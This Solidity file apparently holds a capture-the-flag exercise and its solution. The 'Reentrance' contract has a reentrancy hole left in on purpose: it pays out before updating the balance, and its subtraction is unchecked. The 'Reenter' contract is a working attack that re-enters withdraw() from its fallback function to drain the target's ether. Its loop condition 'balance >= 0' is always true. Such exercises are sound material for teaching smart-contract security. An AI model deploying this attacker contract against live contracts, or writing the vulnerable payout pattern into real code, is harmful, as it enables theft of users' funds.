pragma solidity ^0.6.4;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result, bytes memory data) = msg.sender.call.value(_amount)("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  fallback() external payable {}
}


contract Reenter {
    Reentrance reentranceContract;
    uint public amount = 1 ether;    //withdrawal amount
    
    constructor(address payable reentranceContactAddress) public payable {
        reentranceContract = Reentrance(reentranceContactAddress);
    }

function initiateAttack() public {
    reentranceContract.donate{value:amount}(address(this));//need to increase the balances account in order to pass the first if statement of the withdraw function
    reentranceContract.withdraw(amount); 
  }
  
  fallback() external payable {
    if (address(reentranceContract).balance >= 0 ) {
        reentranceContract.withdraw(amount); 
    }
   }
}
  
  
